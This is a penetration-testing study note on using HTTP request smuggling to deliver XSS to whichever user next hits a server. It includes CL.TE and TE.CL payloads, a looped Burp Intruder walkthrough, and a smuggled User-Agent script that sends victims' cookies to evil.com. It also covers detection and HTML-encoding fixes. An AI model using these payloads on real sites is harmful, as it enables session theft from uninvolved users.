---
tags: [vapt, smuggling, xss, advanced]
difficulty: advanced
module: "26 - HTTP Request Smuggling"
topic: "26.09 Smuggling to Deliver XSS"
---

# 26.09 — Smuggling to Deliver XSS

## What is it?
**Cross-Site Scripting (XSS)** typically requires an attacker to trick a victim into clicking a malicious link (Reflected XSS) or relies on the attacker permanently storing a payload in the database (Stored XSS). 

**Smuggling to Deliver XSS** bypasses both of these limitations. By smuggling a request that triggers a Reflected XSS vulnerability, the attacker can force the *next random user* on the server to execute the payload, without any interaction or clicking required from the victim, and without permanently storing the payload in the database.

Furthermore, HTTP Request Smuggling allows attackers to exploit **XSS in HTTP Headers**. Normally, if an application reflects the `User-Agent` or `Referer` header vulnerably, it is almost impossible to exploit, because an attacker cannot easily force a victim's browser to send a malicious `User-Agent`. But with smuggling, the attacker controls the *entire* HTTP request that the backend processes. The attacker can inject a malicious `User-Agent` into the smuggled request. When the victim's request is appended to it, the backend processes the attacker's headers and returns the XSS payload directly to the victim's browser.

Think of it like a megaphone. Normally, to execute XSS, you have to hand the victim a specific script to read. With smuggling, you sneak into the broadcast room, splice your script into the PA system, and the very next person who walks into the building hears your script blaring from the speakers.

## ASCII Diagram
```text
================================================================================
                    DELIVERING XSS VIA SMUGGLING
================================================================================

[The Pre-Existing Vulnerability]
The target has a Reflected XSS flaw in the User-Agent header:
GET / HTTP/1.1
User-Agent: <script>alert(1)</script>
(Response: "Welcome! Your browser is: <script>alert(1)</script>")

[The Smuggling Exploit]
Attacker sends a CL.TE payload containing the XSS in the header:
POST / HTTP/1.1
Transfer-Encoding: chunked

0
GET / HTTP/1.1                       <-- SMUGGLED REQUEST
User-Agent: <script>alert(1)</script>  <-- Malicious Header!
X-Ignore: X

[The Victim Connection]
Victim sends: GET /home HTTP/1.1

[The Back-End Processing]
Back-End concatenates the Victim's request to the Smuggled Request.
Back-End processes: GET /
Back-End reads the attacker's User-Agent header.
Back-End generates the Response containing the XSS payload.

[Result]
The Front-End hands the XSS response to the Victim.
The Victim's browser executes the JavaScript!
================================================================================
```

## How to Find It
- **Manual steps:**
  1. Find a working smuggling vulnerability (CL.TE, TE.CL).
  2. Find an endpoint that reflects user input. Look specifically for endpoints that reflect HTTP Headers (`User-Agent`, `X-Forwarded-For`, `Referer`), as these are often overlooked by developers because they are "unexploitable" in normal scenarios.
  3. Formulate the smuggled request to target the reflective endpoint, injecting your XSS payload into the vulnerable header or parameter.

## How to Exploit It
- **Step-by-step walkthrough:**
  Let's exploit a site that reflects the `User-Agent`.
  1. Carrier Request: Send a `POST /` with `Transfer-Encoding: chunked`.
  2. Smuggled Request: `GET / HTTP/1.1\r\nHost: vulnerable.com\r\nUser-Agent: <script>fetch('http://evil.com/?cookie='+document.cookie)</script>\r\nX-Ignore: `
  3. Send the payload continuously in a loop using Burp Intruder (e.g., 1 request every 2 seconds).
  4. Wait. Every time a random victim navigates to `vulnerable.com`, their request is appended to your smuggled request.
  5. The backend reflects your malicious User-Agent to the victim.
  6. The victim's browser executes the script and sends their session cookie to your `evil.com` server.

- **Actual payloads:**
  **Smuggling XSS via a POST parameter (TE.CL):**
  ```http
  POST / HTTP/1.1
  Host: vulnerable.com
  Content-Length: 4
  Transfer-Encoding: chunked
  
  6a
  POST /search HTTP/1.1
  Host: vulnerable.com
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 40
  
  query=<script>alert('XSS')</script>
  0
  
  ```

## Real-World Example
A classic example involves applications that perform logging and display those logs in an admin panel. An attacker finds a TE.CL vulnerability on the main public-facing website. The attacker smuggles a request to `GET /` but injects a malicious XSS payload into the `X-Forwarded-For` header. When a random public user hits the site, the backend logs the request. The backend records the attacker's `X-Forwarded-For` IP address (the XSS payload). Later, when an Administrator logs into the backend admin panel to view the traffic logs, the XSS payload executes in the Administrator's browser, allowing the attacker to hijack the admin session.

## How to Fix It
- **Developer remediation:**
  1. **Fix Smuggling:** Address the root cause at the proxy layer (See [[01 - What is HTTP Request Smuggling?]]).
  2. **Context-Aware Encoding:** Never trust HTTP headers. If you display a `User-Agent` or `X-Forwarded-For` IP on a webpage, you must HTML-encode it (e.g., `<` becomes `&lt;`). 

## Chaining Opportunities
- This vuln + [[01 - Web Cache Poisoning Basics]] → If the response containing the smuggled XSS payload is served with caching headers (e.g., `Cache-Control: max-age=3600`), the CDN will cache the XSS payload. Now, *every* user who visits that URL for the next hour will be attacked, creating a mass-exploitation event.

## Related Notes
- [[01 - What is HTTP Request Smuggling?]]
- [[06 - Response Queue Poisoning]]
